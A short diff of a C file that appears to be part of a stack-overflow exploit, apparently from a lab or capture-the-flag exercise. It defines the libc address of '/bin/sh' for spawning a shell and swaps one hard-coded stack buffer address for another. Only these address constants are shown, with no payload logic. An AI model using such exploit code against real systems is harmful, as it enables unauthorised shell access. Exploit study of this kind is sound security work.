@@ -13,8 +13,8 @@ unsigned char* littleEndian(char *str, int numChars);
 
 //address of /bin/sh in libc
 #define BIN_SH_ADDR "0x7ffff7b99673"
-
-#define BUFFER_ADDR "0x7fffffffdcb0"
+//#define BUFFER_ADDR "0x7fffffffdcb0"
+#define BUFFER_ADDR "0x7fffffffdc30"
 
 
 int main(int argc, char *argv[]){
